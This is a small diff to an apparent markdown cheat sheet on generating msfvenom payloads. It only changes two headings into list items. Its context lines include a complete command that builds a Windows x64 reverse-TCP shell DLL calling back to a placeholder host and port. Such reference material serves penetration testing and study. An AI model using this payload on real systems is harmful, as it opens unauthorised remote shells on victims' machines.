@@ -6,7 +6,7 @@ https://book.hacktricks.xyz/shells/shells/msfvenom
 
 ### :open_file_folder: Windows
 
-#### dll
+- dll
 
 x86(try first)
 
@@ -20,7 +20,7 @@ x64
 msfvenom -p windows/x64/shell_reverse_tcp -f dll -o xxx.dll LHOST=<IP> LPORT=<PORT>
 ```
 
-#### exe
+- exe
 
 Staged Payloads for Windows
 
